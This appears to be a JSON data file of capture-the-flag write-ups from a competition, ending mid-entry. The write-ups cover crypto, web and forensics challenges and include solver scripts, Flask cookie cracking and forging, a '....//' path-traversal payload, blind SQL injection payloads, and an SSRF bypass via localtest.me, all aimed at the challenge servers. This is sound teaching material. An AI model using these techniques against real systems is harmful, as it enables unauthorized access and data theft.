        "description": "Advanced competition featuring challenging pwn and reverse engineering problems.",
        "challenges": [
            {
                "id": "ambystoma-mexicanum",
                "title": "Ambystoma Mexicanum",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We're given a cryptographic service that uses AES-GCM-SIV encryption. The goal is to make the service output the flag by crafting a ciphertext that, when decrypted with multiple keys, produces the message \"gib me flag plis\".</p>\n<h3>Initial Analysis</h3>\n<p>Looking at the challenge code, the service provides several options:\n1. Rotate key (generates a new random key)\n2. Debug (shows keys, ciphertexts, and nonce)\n3. Push ciphertext (allows us to submit one ciphertext)\n4. Request flag (attempts to verify our message)</p>\n<h4>The Flag Request Logic</h4>\n<p>The critical part of the code is in option 4:</p>\n<pre><code class=\"python\">for i in range(4):\n    key = binascii.unhexlify(KEYS[i % len(KEYS)])\n    ct = binascii.unhexlify(CIPHERTEXTS[i % len(CIPHERTEXTS)])\n<p>text = service.decrypt(ct, key)[16 * i:16 * (i+1)].decode('utf-8').strip()</p>\n<p>if not text or len(text) == 0:\n        print(\"why so rude :(\\n\")\n        exit(0)</p>\n<p>usertext += text</p>\n<p>if usertext == REQUEST:  # REQUEST = \"gib me flag plis\"\n    print(f\"Damn, you are something. Here is the flag: {FLAG}\\n\")\n</code></pre></p>\n<p>This code:\n1. Loops 4 times\n2. Uses modulo to cycle through available keys and ciphertexts\n3. Decrypts the ciphertext with each key\n4. Extracts a different 16-byte slice from each decryption: <code>[0:16]</code>, <code>[16:32]</code>, <code>[32:48]</code>, <code>[48:64]</code>\n5. Strips whitespace and concatenates all chunks\n6. Checks if the result equals \"gib me flag plis\"</p>\n<h3>Finding the Vulnerability</h3>\n<h4>Initial Thoughts</h4>\n<p>At first glance, this seems impossible. With 4 different keys, you'd need:\n<ul>\n<li>A ciphertext that decrypts successfully with all 4 keys (AES-GCM-SIV has authentication!)</li>\n<li>Each decryption producing the right bytes at the right positions</li>\n</ul>\n<h4>The Key Insight</h4></p>\n<p>The breakthrough comes from understanding the modulo operators:\n<ul>\n<li><code>KEYS[i % len(KEYS)]</code> - cycles through available keys</li>\n<li><code>CIPHERTEXTS[i % len(CIPHERTEXTS)]</code> - cycles through available ciphertexts</li>\n</ul>\n<strong>If we DON'T rotate the key</strong>, <code>len(KEYS)</code> remains 1, meaning:\n<ul>\n<li><code>KEYS[0 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[1 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[2 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[3 % 1] = KEYS[0]</code></li>\n</ul>\nAll iterations use the <strong>same key</strong>! And with one ciphertext, all iterations use the <strong>same ciphertext</strong> too!</p>\n<h3>The Solution Strategy</h3>\n<p>Since all iterations use the same key and ciphertext, we just need to:\n1. Create a 64-byte plaintext\n2. Position our target message so each 16-byte extraction gives us the right part\n3. Encrypt it with the single key\n4. Handle the <code>.strip()</code> method carefully</p>\n<h4>Handling <code>.strip()</code></h4>\n<p>The tricky part is that <code>.strip()</code> removes <strong>all leading and trailing whitespace</strong>. The target message is \"gib me flag plis\" (16 characters with spaces between words).</p>\n<p>If we split it as: \"gib \" + \"me \" + \"flag \" + \"plis\", the <code>.strip()</code> will remove trailing spaces, giving us \"gibmeflagplis\" (no spaces).</p>\n<p><strong>Solution</strong>: Split the message so spaces are in the MIDDLE of chunks, where <code>.strip()</code> won't touch them:\n<ul>\n<li>Chunk 0 [0:16]: \"gib m\" (5 chars) + padding</li>\n<li>Chunk 1 [16:32]: \"e fla\" (5 chars) + padding</li>\n<li>Chunk 2 [32:48]: \"g pli\" (5 chars) + padding</li>\n<li>Chunk 3 [48:64]: \"s\" (1 char) + padding</li>\n</ul>\nAfter <code>.strip()</code> and concatenation: \"gib m\" + \"e fla\" + \"g pli\" + \"s\" = \"gib me flag plis\" \u2713</p>\n<h3>Exploit Code</h3>\n<pre><code class=\"python\">from cryptography.hazmat.primitives.ciphers.aead import AESGCMSIV\nimport binascii\n<p>&lt;h2&gt;Get key and nonce from debug option (don't rotate keys!)&lt;/h2&gt;\nKEY_HEX = \"b2e12b64da4c319a037ea801ed0b1eda\"\nNONCE_HEX = \"358cef8f8b551be7b1a3ce2d\"</p>\n<p>TARGET = \"gib me flag plis\"</p>\n<p>key = binascii.unhexlify(KEY_HEX)\nnonce = binascii.unhexlify(NONCE_HEX)\naead = b\"\"</p>\n<p>&lt;h2&gt;Create plaintext with spaces in the middle of chunks&lt;/h2&gt;\nplaintext = b'gib m           '  # -&gt; \"gib m\"\nplaintext += b'e fla           '  # -&gt; \"e fla\"\nplaintext += b'g pli           '  # -&gt; \"g pli\"\nplaintext += b's               '  # -&gt; \"s\"</p>\n<p>&lt;h2&gt;Encrypt&lt;/h2&gt;\ncipher = AESGCMSIV(key)\nciphertext = cipher.encrypt(nonce, plaintext, aead)</p>\n<p>print(f\"Ciphertext: {ciphertext.hex()}\")\n</code></pre></p>\n<h3>Exploitation Steps</h3>\n<p>1. Connect to the service: <code>nc remote.infoseciitr.in 4004</code>\n2. <strong>DON'T</strong> choose option 1 (don't rotate keys!)\n3. Choose option 2 (debug) to get the initial key and nonce\n4. Run the exploit script with the key and nonce\n5. Choose option 3 and paste the generated ciphertext\n6. Choose option 4 to get the flag!</p>\n<h3>Key Takeaways</h3>\n<p>1. <strong>Modulo arithmetic matters</strong>: The use of <code>% len(KEYS)</code> meant we could bypass the multi-key requirement entirely\n2. <strong>Read the code carefully</strong>: The vulnerability wasn't in the crypto itself, but in how the keys were managed\n3. <strong>String manipulation edge cases</strong>: Understanding exactly how <code>.strip()</code> works was crucial for crafting the right plaintext\n4. <strong>Sometimes the simple solution works</strong>: Instead of trying to break AES-GCM-SIV with nonce reuse, the real solution was to avoid using multiple keys at all</p>\n<h3>Flag</h3>\n<p>```\nflag{th3_4x0lo7ls_4r3_n07_wh47_th3y_s33m}</p>\n"
            },
            {
                "id": "bolt-fast",
                "title": "Bolt Fast",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "rsa",
                    "cipher"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a modified RSA implementation with the following files:\n<ul>\n<li><code>chall.py</code>: The key generation and encryption code</li>\n<li><code>output.txt</code>: The public key (N, e) and ciphertext (c)</li>\n</ul>\nFlag: <code>flag{w31n3r_d1dn7_73ll_y0u_70_b3_6r33dy}</code></p>\n<h3>Vulnerability Analysis</h3>\n<p>Looking at the key generation code in <code>chall.py</code>:</p>\n<pre><code class=\"python\">def flash_key():\n    while True:\n        p = getPrime(1024)\n        q = getPrime(1024)\n        N = p * q\n        dp_smart = getPrime(16)  # Only 16 bits!\n        try:\n            e = inverse(dp_smart, p-1)\n            return N, e, dp_smart\n        except ValueError:\n            continue\n</code></pre>\n<p>The vulnerability is clear: <code>dp_smart</code> is only a 16-bit prime (maximum value ~65536).</p>\n<p>The relationship is: <code>e * dp \u2261 1 (mod p-1)</code></p>\n<p>This means: <code>e * dp = 1 + k * (p-1)</code> for some integer k</p>\n<p>Rearranging: <code>p = (e * dp - 1) / k + 1</code></p>\n<h3>Attack Strategy</h3>\n<p>Since dp is so small (only 16 bits), we can brute force it:</p>\n<p>1. Iterate through all 16-bit primes for dp (roughly 6,500 primes)\n2. For each dp, compute <code>e * dp - 1</code>\n3. Try different values of k to find when <code>(e * dp - 1) / k + 1</code> gives us a valid factor of N\n4. Once we find p, compute q = N / p\n5. Calculate the private key d and decrypt the message</p>\n<h3>Solution Code</h3>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes, isPrime\n<p>N = 22061149554706951873851465765917042279909309233484615798640186468876401527123242297915465375459511054772541825273007749026648641620485458471351811298443479262277231839408201654282927999029324652496830649919637863202844794784443579336735415046336390091671003022244732389217910334465895328371360158510046347031294125509649474722535171601096998732929497780870057433634214228116293166963101489644680801538837005001377764416442380530464289453201654394144682138927826247301956954884930328147978637795259346321547054237005318172528896865428457293207571804464061990459958593520373578234234490804585522859401957032395007142007\ne = 9648003423571638489624579625383119603270189664714210175737275695548206153582516635644990660189908448510652756058045483763071850222529184219333877863638216254054444012130393864033392161426815671725858723096432660521038315432183692553568344247916320931122090436770154203149432285380142051084178668290839858171\nc = 18817014323644102879407569381912044887671193778381872592373573382139976320220125847317309926920208859012582031032930373240219755720268543444729983316326640661427616841700761054678137741340093140586895094016730198447552611014038632666821117758006775144046000049080406858764900680265384743839472653817299383323869146152251839342236631780818396088131196202767951301023089053662813175083035336272981588533957561537975684034210166185396046071368061264321959248372783262788158418696375783427276741258526067168910326630496339287237940444426277757582174810909733937257258767407189452212391936958267819666424558678534741723930</p>\n<p>print(\"Brute forcing 16-bit dp values...\")</p>\n<p>for dp in range(2, 65536):\n    if not isPrime(dp):\n        continue</p>\n<p>edp_minus_1 = e * dp - 1</p>\n<p>for k in range(1, 100000):\n        if edp_minus_1 % k != 0:\n            continue</p>\n<p>p_minus_1 = edp_minus_1 // k\n        p = p_minus_1 + 1</p>\n<p>if p &gt; 1 and p &lt; N and N % p == 0:\n            q = N // p</p>\n<p>if p * q == N:\n                print(f\"Found: dp={dp}, k={k}\")</p>\n<p>phi = (p - 1) * (q - 1)\n                d = pow(e, -1, phi)\n                m = pow(c, d, N)\n                flag = long_to_bytes(m)</p>\n<p>print(f\"FLAG: {flag.decode()}\")\n                exit()\n</code></pre></p>\n"
            },
            {
                "id": "flask-of-cookies",
                "title": "Flask Of Cookies",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http",
                    "flask",
                    "cookie",
                    "reverse",
                    "crack"
                ],
                "writeup": "<h3>Challenge Description</h3>\nA web exploitation challenge involving a Flask application where the goal is to gain administrative access to retrieve a flag.\n<h3>Analysis</h3>\n<h4>Source Code Review</h4>\nThe provided <code>app.py</code> reveals the core logic:\n<pre><code class=\"python\">def derived_level(sess, secret_key):\n    user = sess.get(\"user\", \"\")\n    role = sess.get(\"role\", \"\")\n    if role == \"admin\" and user == secret_key[::-1]:\n        return \"superadmin\"\n    return \"user\"\n<p>@app.route(\"/admin\")\ndef admin():\n    level = derived_level(session, app.secret_key)\n    if level == \"superadmin\":\n        return render_template(\"admin.html\", flag=flag_value)\n    return \"Access denied.\\n\", 403\n</code></pre></p>\n<p>To get the flag, we need to satisfy two conditions in our session:\n1. <code>role</code> must be set to <code>\"admin\"</code>.\n2. <code>user</code> must be the <strong>reverse</strong> of the server's <code>SECRET_KEY</code>.</p>\n<h4>The Problem</h4>\nThe <code>SECRET_KEY</code> is loaded from the environment variables. The local <code>.env</code> file provided in the download contained a placeholder (<code><fake_secret_key></code>), which does not work on the remote server.\n<p>There was a misleading string in the EXIF data of <code>static/cookie.jpg</code> (<code>fPCwmvV/0a2Rul8RgRsZdaiP8Pfn1EvJXXrJLvSwmAM=</code>), but this turned out to be a rabbit hole (or a hash of a key we couldn't easily crack).</p>\n<h3>Exploitation</h3>\n<h4>1. Obtaining the Secret Key</h4>\nSince we have a valid session cookie from the server (by visiting the homepage), and the server is likely using a weak secret key, we can attempt to brute-force it using <code>flask-unsign</code>.\n<p><strong>Command:</strong>\n<pre><code class=\"bash\">flask-unsign --unsign --cookie \"&lt;server_cookie&gt;\" --wordlist /usr/share/wordlists/rockyou.txt\n</code></pre></p>\n<p><strong>Result:</strong>\nThe tool successfully cracks the signature and reveals the secret key: <code>qwertyuiop</code>.</p>\n<h4>2. Forging the Admin Cookie</h4>\nWith the secret key (<code>qwertyuiop</code>), we can now forge a valid session cookie that satisfies the exploit conditions.\n<ul>\n<li>  <strong>Secret Key:</strong> <code>qwertyuiop</code></li>\n<li>  <strong>Target Role:</strong> <code>admin</code></li>\n<li>  <strong>Target User:</strong> <code>poiuytrewq</code> (The secret key reversed)</li>\n</ul>\n<strong>Forge Script:</strong>\n<pre><code class=\"python\">from flask.sessions import SecureCookieSessionInterface\nfrom flask import Flask\n<p>app = Flask(__name__)\napp.secret_key = \"qwertyuiop\"</p>\n<p>session_interface = SecureCookieSessionInterface()\nserializer = session_interface.get_signing_serializer(app)</p>\n<p>session_data = {\"user\": \"poiuytrewq\", \"role\": \"admin\"}\ncookie_val = serializer.dumps(session_data)</p>\n<p>print(f\"Forged Cookie: {cookie_val}\")\n</code></pre></p>\n<h4>3. Retrieving the Flag</h4>\nWe send the forged cookie to the <code>/admin</code> endpoint.\n<p><strong>Command:</strong>\n<pre><code class=\"bash\">curl -H \"Cookie: session=&lt;forged_cookie&gt;\" http://104.198.24.52:6011/admin\n</code></pre></p>\n<p><strong>Response:</strong>\nThe server accepts the cookie as valid superadmin credentials and returns the page containing the flag.</p>\n<h3>Flag</h3>\n<pre><code class=\"\">flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}\n</code></pre>\n"
            },
            {
                "id": "fractonacci",
                "title": "Fractonacci",
                "category": "Forensics",
                "tags": [
                    "image"
                ],
                "writeup": "<h3>Challenge Description</h3>\n\"Beautiful. Red. Fractonacci. What could this mean??\"\nWe are provided with an image <code>fractonacci.png</code>.\n<h3>Solution</h3>\n<p>1. <strong>Analysis</strong>:\n<ul>\n<li>The image is a large PNG (6000x6000).</li>\n<li>The name \"Fractonacci\" suggests a connection to Fractals and Fibonacci numbers.</li>\n<li>The hint \"Red\" suggests looking at the Red color channel.</li>\n</ul>\n2. <strong>Extraction</strong>:\n<ul>\n<li>We extracted the Red channel data from the image.</li>\n<li>Using <code>imagemagick</code>:</li>\n</ul>\n     <pre><code class=\"bash\">     convert challenge.png -channel R -separate -depth 8 red.gray\n     </code></pre></p>\n<p>3. <strong>Decoding</strong>:\n<ul>\n<li>We wrote a Python script to analyze the raw bytes of the Red channel (<code>red.gray</code>).</li>\n<li>Following the \"Fibonacci\" hint, we examined the byte values at indices corresponding to the Fibonacci sequence (1, 2, 3, 5, 8, 13, ...).</li>\n<li>The sequence $F_n$ where $F_0=0, F_1=1, F_{n}=F_{n-1}+F_{n-2}$.</li>\n<li>We extracted bytes at indices: 1, 2, 3, 5, 8, 13, 21, ...</li>\n</ul>\n4. <strong>Result</strong>:\n<ul>\n<li>The extracted characters formed the string: <code>lag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code>.</li>\n<li>Prepending the missing 'f' (which would correspond to a theoretical earlier index or just implied), we get the complete flag.</li>\n</ul>\n<h3>Flag</h3>\n<code>flag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code></p>\n"
            },
            {
                "id": "image-gallery",
                "title": "Image Gallery",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "http",
                    "image"
                ],
                "writeup": "<p>Analysis:\n1.  <strong>Source Code Review</strong>: The challenge provides a source code archive (<code>gallery.zip</code>). Analyzing <code>server.js</code>, we find an express server with an endpoint <code>/image</code>.\n2.  <strong>Vulnerable Endpoint</strong>: The <code>/image</code> endpoint takes a <code>file</code> query parameter to serve images from the <code>images</code> directory (<code>BASE_DIR</code>).\n    <pre><code class=\"javascript\">    const BASE_DIR = path.join(__dirname, 'images');\n    // ...\n    app.get('/image', (req, res) =&gt; {\n      let file = req.query.file || '';\n      // ...\n      file = file.replace(/\\\\/g, '/');\n      file = file.split('../').join(''); // Vulnerable sanitization\n      const resolved = path.join(BASE_DIR, file);\n      // ...\n      fs.readFile(resolved, (err, data) =&gt; { ... });\n    });\n    </code></pre>\n3.  <strong>Sanitization Flaw</strong>: The code attempts to prevent path traversal by removing <code>../</code> using <code>split('../').join('')</code>. However, this is not recursive. It effectively removes all occurrences of <code>../</code> present *initially*, but does not check if new <code>../</code> sequences are formed *after* the removal.</p>\n<p>Exploit:\n1.  <strong>Bypassing the Filter</strong>: If we send the string <code>....//</code>, the code splits it by <code>../</code>.\n<ul>\n<li>  <code>\"....//\".split('../')</code> results in <code>[\"..\", \"/\"]</code>.</li>\n<li>  Joining them back together results in <code>../</code>.</li>\n</ul>\n2.  <strong>Target File</strong>: The file structure shows a <code>secret</code> directory at the same level as <code>images</code>.\n<ul>\n<li>  <code>gallery/images/</code> (Base Directory)</li>\n<li>  <code>gallery/secret/flag.txt</code></li>\n</ul>\n3.  <strong>Payload</strong>: To access <code>../secret/flag.txt</code>, we can use <code>....//secret/flag.txt</code>.\n4.  <strong>Execution</strong>:\n    <pre><code class=\"bash\">    curl \"http://104.198.24.52:6012/image?file=....//secret/flag.txt\"\n    </code></pre>\n    Response:\n    <pre><code class=\"\">    flag{sTr1pp1ng_d0Ts_and_SLasH3s_d03sNt_sTr1p_bUgs}\n    </code></pre></p>\n"
            },
            {
                "id": "marketflow",
                "title": "Marketflow",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "web",
                    "http"
                ],
                "writeup": "<h4>Vulnerability Analysis</h4>\n<p>1.  <strong>Insecure Deserialization:</strong>\n<ul>\n<li>  The endpoint <code>/api/analytics/reports</code> accepts a JSON payload and processes it using <code>ObjectManager.deserialize</code>.</li>\n<li>  This method allows instantiating any class registered in <code>CLASS_REGISTRY</code> with arbitrary constructor arguments.</li>\n<li>  This is the entry point for the exploit chain.</li>\n</ul>\n2.  <strong>Arbitrary File Write (Gadget Chain):</strong>\n<ul>\n<li>  The <code>Scheduler</code> processes tasks and, for <code>ReportConfiguration</code> objects, can trigger <code>cache_service.prime(output_config)</code>.</li>\n<li>  <code>CacheService.prime</code> calls <code>config.persistence.write(data)</code>.</li>\n<li>  <code>PersistenceAdapter.write</code> (the persistence object) uses <code>os.path.join</code> with user-controlled input. If an absolute path or path traversal (e.g., <code>../</code>) is provided, it can write to unintended locations.</li>\n<li>  This allows us to write arbitrary content to files in the writable directories (specifically <code>/var/tmp/sessionmaze/templates</code> via traversal).</li>\n</ul>\n3.  <strong>SSRF (Trigger Mechanism):</strong>\n<ul>\n<li>  The <code>Scheduler</code> only processes tasks when <code>/internal/cron/process</code> is called. This endpoint is restricted to <code>localhost</code>.</li>\n<li>  The <code>/api/webhooks/forward</code> endpoint uses <code>WebhookForwarder</code> to make HTTP requests.</li>\n<li>  Although there is a protection mechanism (<code>is_safe_url</code>), it can be bypassed using a domain that resolves to 127.0.0.1 (e.g., <code>localtest.me</code>). This allows us to trigger the cron job externally.</li>\n</ul>\n4.  <strong>Local File Inclusion (LFI):</strong>\n<ul>\n<li>  The <code>TemplateRenderer</code> has a \"legacy\" mode for files ending in <code>.tpl</code>.</li>\n<li>  If a template contains <code>@config: /path/to/file</code>, the renderer reads that file and includes its content in the output HTML.</li>\n<li>  By writing a malicious <code>.tpl</code> file (using the file write vulnerability) and then instructing the application to use it as a template, we can read <code>/flag.txt</code>.</li>\n</ul>\n<h4>Exploit Summary</h4></p>\n<p>I created and executed an exploit script (<code>exploit.py</code>) that performed the following steps:\n1.  <strong>Register & Login:</strong> Created a user to access the authenticated API.\n2.  <strong>Stage 1 (Write):</strong> Scheduled a malicious task to write a file named <code>exploit.tpl</code> to <code>../templates/exploit.tpl</code> (which resolves to <code>/var/tmp/sessionmaze/templates/exploit.tpl</code>). The content included <code>@config: /flag.txt</code>.\n3.  <strong>Trigger:</strong> Used the SSRF vulnerability to hit <code>http://localtest.me:5000/internal/cron/process</code>, forcing the scheduler to execute the write task.\n4.  <strong>Stage 2 (Read):</strong> Scheduled a second task to generate a report using the <code>exploit.tpl</code> template.\n5.  <strong>Trigger:</strong> Triggered the scheduler again.\n6.  <strong>Retrieve:</strong> Downloaded the generated report. The flag was embedded in an HTML comment within the report.</p>\n<h4>Flag</h4>\n<p><code>flag{n3st3d_d3s3r1al1z4t10n_ssrf_ch41n_c0mpl3t3_0b53wrf}</code></p>\n"
            },
            {
                "id": "no-sight",
                "title": "No Sight",
                "category": "Web Exploitation",
                "tags": [
                    "sql",
                    "injection"
                ],
                "writeup": "<h3>Reconnaissance</h3>\n1.  <strong>Initial Probing</strong>:\n<ul>\n<li>  Input <code>1</code> -> \"User found!\"</li>\n<li>  Input <code>999999</code> -> \"No user found\"</li>\n</ul>\n2.  <strong>Vulnerability Detection</strong>:\n<ul>\n<li>  We suspected SQL Injection.</li>\n<li>  Input <code>1 AND 1=1</code> -> \"User found!\" (True condition)</li>\n<li>  Input <code>1 AND 1=2</code> -> \"No user found\" (False condition)</li>\n<li>  This confirmed a <strong>Boolean-based Blind SQL Injection</strong> vulnerability. We can ask the database true/false questions and infer data based on the response.</li>\n</ul>\n<h3>Database Enumeration</h3>\n1.  <strong>Identifying the Database</strong>:\n<ul>\n<li>  Standard MySQL functions like <code>database()</code> and <code>version()</code> failed or were filtered.</li>\n<li>  We tested for SQLite by querying the <code>sqlite_master</code> table.</li>\n<li>  Payload: <code>1 AND (SELECT 1 FROM sqlite_master LIMIT 1) = 1</code> -> \"User found!\"</li>\n<li>  This confirmed the database is <strong>SQLite</strong>.</li>\n</ul>\n2.  <strong>Finding Tables</strong>:\n<ul>\n<li>  We knew there was likely a <code>users</code> table.</li>\n<li>  To find the flag, we searched for other tables. We checked for a second table in <code>sqlite_master</code>.</li>\n<li>  We wrote a Python script using binary search to extract the name of the table that is NOT 'users'.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(name, 1, 1) FROM sqlite_master WHERE type='table' AND name != 'users' LIMIT 1) > 'char'</code></li>\n<li>  The script revealed a table named: <code>secret_flags</code>.</li>\n</ul>\n3.  <strong>Finding Columns</strong>:\n<ul>\n<li>  We needed to know the column names in <code>secret_flags</code>.</li>\n<li>  We extracted the <code>CREATE TABLE</code> SQL statement for the <code>secret_flags</code> table from <code>sqlite_master</code>.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(sql, 1, 1) FROM sqlite_master WHERE type='table' AND name='secret_flags') > 'char'</code></li>\n<li>  The result was:</li>\n</ul>\n        <pre><code class=\"sql\">        CREATE TABLE secret_flags (\n            id INTEGER PRIMARY KEY,\n            flag TEXT NOT NULL\n        )\n        </code></pre>\n<ul>\n<li>  This confirmed the target column is <code>flag</code>.</li>\n</ul>\n<h3>Exploitation</h3>\n1.  <strong>Extracting the Flag</strong>:\n<ul>\n<li>  With the table <code>secret_flags</code> and column <code>flag</code> identified, we wrote a final Python script to extract the flag's content character by character.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(flag, 1, 1) FROM secret_flags LIMIT 1) > 'char'</code></li>\n<li>  The script used binary search for efficiency.</li>\n</ul>\n<h3>Result</h3>\nThe extraction script successfully recovered the flag:\n<p><strong>Flag</strong>: <code>flag{bl1nd_but_n0t_l0st_1n_th3_d4rk}</code></p>\n"
            },
            {
                "id": "peak-conjecture",
                "title": "Peak Conjecture",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "pwn",
                    "reverse"
                ],
                "writeup": "<p>chall.py analysis:\nThe core of the challenge revolved around a function <code>uniqueHash(x)</code> which calculates the number of steps required for <code>x</code> to reach 1 according to the Collatz conjecture (3x+1 problem), with a cap of 10000 steps.</p>\n<p>The server's logic:\n1. It has a secret <code>message</code> (likely a bytes-to-long converted flag).\n2. It calculates <code>myHash = uniqueHash(message)</code>.\n3. It prints <code>uniqueHash(myHash)</code> to the user.\n4. It then asks the user to input 10 distinct integers <code>x</code> such that:\n<ul>\n<li><code>uniqueHash(x) == myHash</code></li>\n<li><code>isPrime(x) == isPrime(message)</code></li>\n</ul>\n5. If 10 such numbers are provided, it reveals <code>message</code> (the flag).</p>\n<p>Initial Interaction and Deduction:\nUpon connecting to the server using <code>nc remote.infoseciitr.in 4002</code>, the server output:\n\"This is my hash of hash: 25\"</p>\n<p>This means <code>uniqueHash(myHash) = 25</code>.\n<code>myHash</code> is itself an integer representing a number of Collatz steps. Since <code>uniqueHash(myHash) = 25</code>, it means <code>myHash</code> is an integer that takes 25 steps to reach 1 in the Collatz sequence.</p>\n<p>Strategy:\n1.  <strong>Find <code>myHash</code>:</strong> We need to find <code>S</code> such that <code>uniqueHash(S) = 25</code>. Since <code>myHash</code> is a step count, it's likely a relatively small integer (usually < 10000). We can iterate through integers <code>S</code> from 1 to 10000 and calculate <code>uniqueHash(S)</code>. The initial solver script performed this, finding a list of candidates for <code>myHash</code>. The first successful probe revealed <code>myHash = 4017</code>.\n2.  <strong>Determine <code>isPrime(message)</code>:</strong> To satisfy <code>isPrime(x) == isPrime(message)</code>, we need to know the primality of <code>message</code>. By sending a known composite number <code>x</code> (e.g., <code>2^4017</code>) that satisfies <code>uniqueHash(x) == 4017</code>, we can observe the server's response.\n<ul>\n<li>If the server says \"Correct!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are the same. Since <code>x</code> is composite, <code>message</code> is composite.</li>\n<li>If the server says \"Well Well, you failed!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are different. Since <code>x</code> is composite, <code>message</code> is prime.</li>\n</ul>\n    My solver found <code>myHash = 4017</code> and determined that <code>message</code> is prime.\n3.  <strong>Generate 10 inputs:</strong> We need to find 10 distinct prime numbers <code>x</code> such that <code>uniqueHash(x) == 4017</code>.\n    To do this, we can reverse the Collatz sequence from 1 for <code>4017</code> steps. The reverse operations are:\n<ul>\n<li><code>v -> 2 * v</code> (always valid)</li>\n<li><code>v -> (v - 1) / 3</code> (valid if <code>(v - 1)</code> is divisible by 3 and <code>(v - 1) / 3</code> is odd and greater than 1).</li>\n</ul>\n    Since <code>4017</code> steps is a large number, the resulting <code>x</code> values will be very large (thousands of bits long). The density of primes among such large numbers is low (approximately <code>1 / ln(N)</code>). Therefore, we need to generate a large number of candidates and test their primality.</p>\n<p>Solver Implementation:\nMy Python solver script used the <code>pwn</code> library for network interaction and <code>Crypto.Util.number.isPrime</code> for primality testing.</p>\n<p>The key steps in the solver were:\n<ul>\n<li>  <strong><code>uniqueHash(x)</code> function:</strong> A local re-implementation of the server's Collatz hash function.</li>\n<li>  <strong><code>generate_inputs(target_steps, beam_width, forbidden)</code> function:</strong> This function generates numbers that have a specific <code>target_steps</code> in their Collatz sequence. It works by starting from 1 and reversing the Collatz operations for <code>target_steps</code> iterations. To handle the exponential growth, it uses a <code>beam_width</code> to limit the number of active paths at each step, taking a random sample if the paths exceed the beam width.</li>\n<li>  <strong>Pre-calculation of primes:</strong> To avoid server timeouts, the solver first generated <code>myHash</code> (4017) and <code>isPrime(message)</code> (True). Then, it locally generated a large set of candidates using <code>generate_inputs(4017, 60000, [])</code>. From these candidates, it filtered out and stored 10 distinct prime numbers.</li>\n<li>  <strong>Server Interaction:</strong> After pre-calculating the primes, the solver connected to the remote server, read the initial prompt, and then sent the 10 pre-calculated primes one by one. The server responded with \"Correct!\" for each valid input.</li>\n<li>  <strong>Flag Retrieval:</strong> After the 10th correct input, the server printed the flag.</li>\n</ul>\nChallenges and Refinements:\n<ul>\n<li>  <strong><code>Cryptodome</code> vs <code>Crypto</code>:</strong> The <code>chall.py</code> used <code>Cryptodome.Util.number.isPrime</code>, while <code>pycryptodome</code> typically installs as <code>Crypto</code>. This was fixed by changing the import in the solver.</li>\n<li>  <strong>Server Timeout:</strong> The server seemed to have an idle timeout or processing timeout. Initially, my solver performed the <code>myHash</code> and primality probing, and then the prime generation *after* connecting to the server. This often led to an <code>EOFError</code> because the generation took too long. The solution was to perform all computationally intensive tasks (like generating prime candidates) locally *before* establishing the connection to the remote server.</li>\n<li>  <strong>Generating Enough Primes:</strong> Finding 10 primes with a specific, large Collatz stopping time requires exploring a wide range of numbers. Initially, my <code>beam_width</code> for candidate generation was too small, yielding fewer than 10 primes. Increasing the <code>beam_width</code> (e.g., to 60000) allowed the generator to produce enough candidates to find the required 10 primes.</li>\n</ul>\nFlag:\n<code>flag{1r0n_m4n_f0r_c0ll4tz_3ndg4m3_0f_cryp70gr4phy_1s_p34k_r16h7_313}</code></p>\n"
            },
            {
                "id": "the-job",
                "title": "The Job",
                "category": "Cryptography",
                "tags": [
                    "pwn",
                    "reverse"
                ],
                "writeup": "<p>Phase 1: Balancing the Initial Hash Table\n1.  Understanding the Requirement: The server provided 896 unique numbers and expected a polynomial $P(x)$ whose coefficients we would provide. The hash function was $H(x) = P(x) \\pmod{10^9+7}$. This hash was used to place numbers into 256 slots. The manager demanded that the inputs be \"equally divided,\" meaning the difference in sizes of any two slots should not be 2 or more.\n2.  Determining the Target Distribution: With $N=896$ numbers and $K=256$ slots, the average number of items per slot is $896/256 = 3.5$. To satisfy the \"difference in sizes of any two slots should not be 2 or more\" constraint and the maximum size limit of 4 items per slot (derived from <code>(N+K-1)/K</code> check), the only valid distribution is to have exactly 128 slots containing 3 items and 128 slots containing 4 items.\n3.  Polynomial Construction (Lagrange Interpolation): We needed to find a polynomial $P(x)$ such that for each given number $x_i$ from the leaked <code>number_array</code>, $P(x_i) \\pmod{MOD}$ resulted in a specific target slot index $y_i$. We constructed a mapping where 128 input numbers were assigned to each of the 128 \"size 4\" slots, and 128 input numbers were assigned to each of the 128 \"size 3\" slots. We then used Lagrange Interpolation over a finite field ($MOD = 10^9+7$) to determine the coefficients of this polynomial. The polynomial's degree was $N-1$, which was acceptable. The <code>solve_poly</code> function implemented this, returning the coefficients in a low-to-high degree order, which were then reversed before sending.</p>\n<p>Phase 2: Finding the Hidden Junk Value\n1.  The Twist: After Phase 1, the server revealed that a \"junk\" value was already placed in a random, unknown slot (<code>target</code>). This meant one slot would start with 1 item, and the others with 0. We had 6 trials to find this <code>target</code> index.\n2.  Trial Mechanism: In each trial, we submitted a new polynomial. The server would then check if the hash table, *including the junk value*, was balanced (i.e., no slot had more than 4 items).\n<ul>\n<li>  If the <code>target</code> slot (which already had 1 junk item) received 4 additional items from our polynomial, its total count would be 5, causing the server to report \"failed.\"</li>\n<li>  If the <code>target</code> slot received 3 additional items from our polynomial, its total count would be 4, causing the server to report \"passed.\"</li>\n</ul>\n3.  Binary Search Strategy: This provided a binary (Pass/Fail) signal. With 256 possible <code>target</code> indices and 6 trials, we could narrow down the possibilities significantly.\n<ul>\n<li>  We maintained a 